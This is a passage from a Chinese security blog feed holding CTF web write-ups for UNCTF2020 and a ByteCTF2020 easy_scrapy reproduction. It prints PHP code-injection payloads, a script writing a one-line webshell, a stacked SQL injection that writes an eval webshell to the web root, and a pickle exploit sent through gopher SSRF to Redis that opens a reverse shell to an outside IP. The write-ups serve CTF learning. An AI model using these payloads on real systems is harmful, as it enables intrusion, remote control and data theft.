(preg_match (<span class="string">&#x27;/&#x27;</span> . $blacklisted . <span class="string">&#x27;/m&#x27;</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;WTF???&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist2 <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/im&#x27;</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sry,try again&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>预期解，利用PHP5.6新引入的特性——变长参数</p><p><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html">https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html</a></p><p>和Python中的<code>**kwargs</code>，类似，在PHP中可以使用 <code>func(...$arr)</code>这样的方式，将<code>$arr</code>数组展开成多个参数，传入func函数。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?1[]&#x3D;test&amp;1[]&#x3D;system(%27ls%20&#x2F;%27);&amp;2&#x3D;assert</span><br><span class="line">POST</span><br><span class="line">code&#x3D;usort(...$_GET);</span><br></pre></td></tr></table></figure><p>也就是相当于执行了<code>usort([&quot;test&quot;, &quot;system('ls /');&quot;], assert);</code></p><p>P年的那篇文章还提到了可以利用文件包含写shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code&#x3D;$_GET[a](N,a,8);&amp;a&#x3D;file_put_contents</span><br></pre></td></tr></table></figure><p>用脚本自动跑一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">strings = <span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbOV0pOw&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    url = <span class="string">&quot;http://fda5225d-9b6e-4633-985e-7b0fca4a99ac.node1.hackingfor.fun/1nD3x.php?code=$_GET[a](A,&#123;&#125;,8);&amp;a=file_put_contents&quot;</span>.format(s)</span><br><span class="line">    print(url)</span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    <span class="comment"># print(res.status_code)</span></span><br></pre></td></tr></table></figure><p>base64编码后的一句话已经写入了A文件，再文件包含这个A文件。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201118212038.png" alt=""></p><h2 id="俄罗斯方块">俄罗斯方块</h2><p>题目有提示用到wasm，网上先稍微了解一下。查看源代码发现是有wasm.gz的源文件。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117220752.png" alt=""></p><p>拼接一下文件名下载下来解压之后拿到<code>blocks.wasm</code>，再用wabt工具集中的wasm2wat对其进行反编译</p><blockquote><p><a href="https://github.com/WebAssembly/wabt">https://github.com/WebAssembly/wabt</a></p><p><a href="https://webassembly.github.io/wabt/doc/wasm2wat.1.html">https://webassembly.github.io/wabt/doc/wasm2wat.1.html</a></p></blockquote><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117221818.png" alt=""></p><p>反编译之后打开wat文件我人都傻了，啥都看不懂，后来我把所有能用的工具试了一下，就是没想到在反编译后的文件中查找99999关键字</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117221631.png" alt=""></p><p>再修改这个分数，最后编译成wasm文件</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117221929.png" alt=""></p><p>把源码保存下来，替换掉block.wasm.gz，在本地起服务，再随便玩玩拿到flag。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117231202.png" alt=""></p><h2 id="ezphp">ezphp</h2><p>题目这样出我真的。。。。没想到</p><p>并不知道username和password的确切的值，要用php绕类型比较进行绕过，构造paylaod：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span>=&gt;<span class="literal">True</span>,<span class="string">&quot;password&quot;</span>=&gt;<span class="literal">True</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 得到: a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span></span><br></pre></td></tr></table></figure><p>POST参数即可得到flag</p><h2 id="checkin-sql">checkin-sql</h2><p>强网杯2019随便住魔改，提示flag不在数据库中，那么就肯定要写shell了。</p><p>堆叠注入查表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;;show tables;</span><br></pre></td></tr></table></figure><p>查表字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;;desc 0xDktb;</span><br></pre></td></tr></table></figure><p>用预处理和十六进制编码<code>select * from 0xDktb</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;set @a&#x3D;0x73656c656374202a2066726f6d20603078446b746260;prepare execsql from @a; execute execsql;</span><br></pre></td></tr></table></figure><p>发现被过滤掉了<code>set</code>关键字。（在比赛的时候没想到可以直接不要set语句。。。</p><p>改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;; prepare execsql from 0x73656c656374202a2066726f6d20603078446b746260;execute execsql;</span><br></pre></td></tr></table></figure><p>发现可以执行成功，那么直接写shell<code>select '&lt;?php @eval($_POST[ccc]);?&gt;' into outfile '/var/www/html/shell.php'</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;; prepare execsql from 0x73656c65637420273c3f70687020406576616c28245f504f53545b6363635d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f7368656c6c2e70687027;execute execsql;</span><br></pre></td></tr></table></figure><p>用蚁剑连接拿flag。</p><h2 id="赛后收获">赛后收获</h2><ul><li>flask模板注入过滤了关键字或者下划线可以用管道符+join的方式绕过；</li><li><code>is_file()</code>函数的参数是一个数组的时候会返回一个NULL；</li><li>.htaccess可以用换行的方式绕过关键字黑名单</li><li>接上一条，如果过滤了<code>\</code>，在.htaccess中解析某个后缀为cgi文件，再上传一个cgi文件运行后读取flag；</li><li>PHP复杂变量解析；</li><li>PHP5.6以后版本有变长参数的特性；</li><li>在代码注入的题目中还可以用这种方式写入shell：<code>$_GET[a](N,a,8);&amp;a=file_put_contents</code>，再用PHP伪协议读取；</li><li>SQL注入预编译过了<code>set</code>，可以直接用<code>prepare execsql from 0x....</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;UNCTF2020-Web-wp&quot;&gt;UNCTF2020 Web wp&lt;/h1&gt;
&lt;h2 id=&quot;easyssrf-solved&quot;&gt;easyssrf [solved]&lt;/h2&gt;
&lt;p&gt;算是签到题，比较easy&lt;/p&gt;
&lt;figure class=&quot;highlight
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF2020-scrapy_redis复现</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/26.ByteCTF2020-scrapy-redis%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/26.ByteCTF2020-scrapy-redis%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-11-05T15:30:44.000Z</published>
    <updated>2020-11-05T15:32:20.766Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ByteCTF2020复现">ByteCTF2020复现</h1><p>这web题目出的简直就是神仙。。</p><h2 id="easy-scrapy">easy_scrapy</h2><p>首页是一个可以提交URL的输入框，验证码给出了md5加密后的前5位，可以直接写Python脚本爆破。添加数据的时候，在VPS监听端口：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201102143549.png" alt=""></p><p>从上图中可以看出使用的是scrapy+redis，应该是url数据会存储在Redis中，然后用scrapy爬虫爬取。</p><p>添加完数据后，在MyUrlList中会显示数据，点击记录，发现会访问<code>http://101.200.50.18:30010/result?url=http://xx.xx.xxx.xx:8888/</code>，可能存在SSRF，监听端口：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201102141039.png" alt=""></p><p>后面<code>/result?url</code>则是用了另一种功能进行pycurl的请求，类似于<code>curl</code>，同样支持使用Gopher协议。</p><p>复现时候也用SSRF常见利用方式探测端口以及Redis的服务信息，但是没有什么收获。</p><p>转变一下思路，既然是爬虫，那么遇到<code>&lt;a&gt;</code>标签，他就有可能去请求：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201104155454.png" alt=""></p><p>既然是这样，那么就可以把<code>&lt;a&gt;</code>标签的href改成file协议造成任意文件读取：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201104162527.png" alt=""></p><p>OK，验证成功。那么这样的话，就可以读取题目的爬虫源码，但是在读之前，需要知道爬虫源码的绝对路径。可以通过读取<code>/etc/self/environ</code>得到工作路径</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201104170859.png" alt=""></p><p>显示当前<code>PWD=/code</code>，但是我们还不知道项目结构，可以去<a href="https://scrapy-chs.readthedocs.io/zh_CN/0.24/intro/tutorial.html">官方文档</a>中找到这个爬虫框架的结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tutorial&#x2F;</span><br><span class="line">    scrapy.cfg</span><br><span class="line">    tutorial&#x2F;</span><br><span class="line">        __init__.py</span><br><span class="line">        items.py</span><br><span class="line">        pipelines.py</span><br><span class="line">        settings.py</span><br><span class="line">        spiders&#x2F;</span><br><span class="line">            __init__.py</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure><p>这些文件分别是:</p><ul><li><code>scrapy.cfg</code>: 项目的配置文件</li><li><code>tutorial/</code>: 该项目的python模块。之后您将在此加入代码。</li><li><code>tutorial/items.py</code>: 项目中的item文件.</li><li><code>tutorial/pipelines.py</code>: 项目中的pipelines文件.</li><li><code>tutorial/settings.py</code>: 项目的设置文件.</li><li><code>tutorial/spiders/</code>: 放置spider代码的目录.</li></ul><p>首先去看项目配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Automatically created by: scrapy startproject</span><br><span class="line">#</span><br><span class="line"># For more information about the [deploy] section see:</span><br><span class="line"># https:&#x2F;&#x2F;scrapyd.readthedocs.io&#x2F;en&#x2F;latest&#x2F;deploy.html</span><br><span class="line"></span><br><span class="line">[settings]</span><br><span class="line">default &#x3D; bytectf.settings</span><br><span class="line"></span><br><span class="line">[deploy]</span><br><span class="line">#url &#x3D; http:&#x2F;&#x2F;localhost:6800&#x2F;</span><br><span class="line">project &#x3D; bytectf</span><br></pre></td></tr></table></figure><p>得知项目名是<code>bytectf</code>，但是还需要知道<code>bytectf</code>文件夹下的<code>spiders</code>的爬虫文件名。</p><p>读取<code>/proc/self/cmdline</code>，这个文件包含进程的完整命令行信息，我们可以根据他来得知正在运行的爬虫的文件名称。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python &#x2F;usr&#x2F;local&#x2F;bin&#x2F;scrapy crawl byte</span><br></pre></td></tr></table></figure><p>那么当前的爬虫名字是byte。</p><p>读取源码，得到结构如下：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201104172101.png" alt=""></p><p>通过piplelines.py和settings.py分别得到了MongoDB和Redis的配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//pipelines.py</span><br><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BytectfPipeline</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        MONGODB_HOST = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">        MONGODB_PORT = <span class="number">27017</span></span><br><span class="line">        MONGODB_DBNAME = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">        MONGODB_TABLE = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">        MONGODB_USER = <span class="string">&#x27;N0rth3&#x27;</span></span><br><span class="line">        MONGODB_PASSWD = <span class="string">&#x27;E7B70D0456DAD39E22735E0AC64A69AD&#x27;</span></span><br><span class="line">        mongo_client = pymongo.MongoClient(<span class="string">&quot;%s:%d&quot;</span> % (MONGODB_HOST, MONGODB_PORT))</span><br><span class="line">        mongo_client[MONGODB_DBNAME].authenticate(MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)</span><br><span class="line">        mongo_db = mongo_client[MONGODB_DBNAME]</span><br><span class="line">        self.table = mongo_db[MONGODB_TABLE]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line"></span><br><span class="line">        quote_info = dict(item)</span><br><span class="line">        print(quote_info)</span><br><span class="line">        self.table.insert(quote_info)</span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//settings.py</span><br><span class="line">BOT_NAME = <span class="string">&#x27;bytectf&#x27;</span></span><br><span class="line">SPIDER_MODULES = [<span class="string">&#x27;bytectf.spiders&#x27;</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">&#x27;bytectf.spiders&#x27;</span></span><br><span class="line">RETRY_ENABLED = <span class="literal">False</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line">DOWNLOAD_TIMEOUT = <span class="number">8</span></span><br><span class="line">USER_AGENT = <span class="string">&#x27;scrapy_redis&#x27;</span></span><br><span class="line">SCHEDULER = <span class="string">&quot;scrapy_redis.scheduler.Scheduler&quot;</span></span><br><span class="line">DUPEFILTER_CLASS = <span class="string">&quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;</span></span><br><span class="line">REDIS_HOST = <span class="string">&#x27;172.20.0.7&#x27;</span></span><br><span class="line">REDIS_PORT = <span class="number">6379</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line"> <span class="string">&#x27;bytectf.pipelines.BytectfPipeline&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以及主要的爬虫逻辑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> scrapy_redis.spiders <span class="keyword">import</span> RedisSpider</span><br><span class="line"><span class="keyword">from</span> bytectf.items <span class="keyword">import</span> BytectfItem</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ByteSpider</span>(<span class="params">RedisSpider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;byte&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        byte_item = BytectfItem()</span><br><span class="line">        byte_item[<span class="string">&#x27;byte_start&#x27;</span>] = response.request.url</span><br><span class="line">        url_list = []</span><br><span class="line">        test = response.xpath(<span class="string">&#x27;//a/@href&#x27;</span>).getall()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                url = response.request.url + i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = i</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;://&#x27;</span>,url):</span><br><span class="line">                r = scrapy.Request(url,callback=self.parse2,dont_filter=<span class="literal">True</span>)</span><br><span class="line">                r.meta[<span class="string">&#x27;item&#x27;</span>] = byte_item</span><br><span class="line">                <span class="keyword">yield</span> r</span><br><span class="line">            url_list.append(url)</span><br><span class="line">            <span class="keyword">if</span>(len(url_list)&gt;<span class="number">3</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        byte_item[<span class="string">&#x27;byte_url&#x27;</span>] = response.request.url</span><br><span class="line">        byte_item[<span class="string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">yield</span> byte_item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse2</span>(<span class="params">self,response</span>):</span></span><br><span class="line">        item = response.meta[<span class="string">&#x27;item&#x27;</span>]</span><br><span class="line">        item[<span class="string">&#x27;byte_url&#x27;</span>] = response.request.url</span><br><span class="line">        item[<span class="string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure><p>到这里，我用<a href="https://bycsec.top/">byc404</a>写好的docker-compose在本地起爬虫，跟线上的bot+redis+mongo环境基本一致。</p><blockquote><p><a href="https://blog.csdn.net/zwq912318834/article/details/78854571">https://blog.csdn.net/zwq912318834/article/details/78854571</a></p></blockquote><blockquote><p>Github上的环境缺一个文件，需要在<code>easyscrapy/python/bytectf/spiders</code>加一个<code>__init__.py</code>文件。不然scrapy会报没有spiders库。</p></blockquote><p>三个containers启动了之后可以看到爬虫服务已经start了。Redis在本机也映射到了6379端口，进入Redis容器可以看到现在没有keys：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201105194319.png" alt=""></p><p><a href="http://xn--fill-z94fz69b9j1ahda5675ayyp.py">在本机上运行fill.py</a>，需要提前安装<code>https://github.com/wuchengwei0122/redis-py.git</code></p><p>相当于向Redis循环200次添加<code>start_urls:http//baidu.com</code>，这个时候就可以看到<code>byte:requests</code>键存在序列化数据：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201105202111.png" alt=""></p><p>那么利用链就是想办法写入<code>byte:requests</code>键，内容为序列化数据，而写入的方法就是pycurl的SSRF，利用Gopher协议打Redis。</p><p>贴一个官方的exp，用python3生成poc，反弹shell：</p><blockquote><p>由于<code>byte:requests</code>有序列表是zset，需要在Redis上执行ZADD命令。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;119.45.184.10&quot;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">test = str(pickle.dumps(exp()))</span><br><span class="line">poc = test.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;\\n&#x27;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">poc =<span class="string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">print(poc)</span><br></pre></td></tr></table></figure><p>用GET打过去的时候需要二次URL编码。</p><p>参考文章：</p><p><a href="https://northity.com/2020/10/30/ByteCTF%E5%88%9D%E8%B5%9B%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">https://northity.com/2020/10/30/ByteCTF初赛出题笔记/</a></p><p><a href="http://blog.ccreater.top/2020/10/26/2020ByteCTF/">http://blog.ccreater.top/2020/10/26/2020ByteCTF/</a></p><p><a href="https://www.jianshu.com/p/0823666a7687">https://www.jianshu.com/p/0823666a7687</a></p><p><a href="https://blog.csdn.net/zwq912318834/article/details/78854571">https://blog.csdn.net/zwq912318834/article/details/78854571</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ByteCTF2020复现&quot;&gt;ByteCTF2020复现&lt;/h1&gt;
&lt;p&gt;这web题目出的简直就是神仙。。&lt;/p&gt;
&lt;h2 id=&quot;easy-scrapy&quot;&gt;easy_scrapy&lt;/h2&gt;
&lt;p&gt;首页是一个可以提交URL的输入框，验证码给出了md5加密后的前5位
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
</feed>
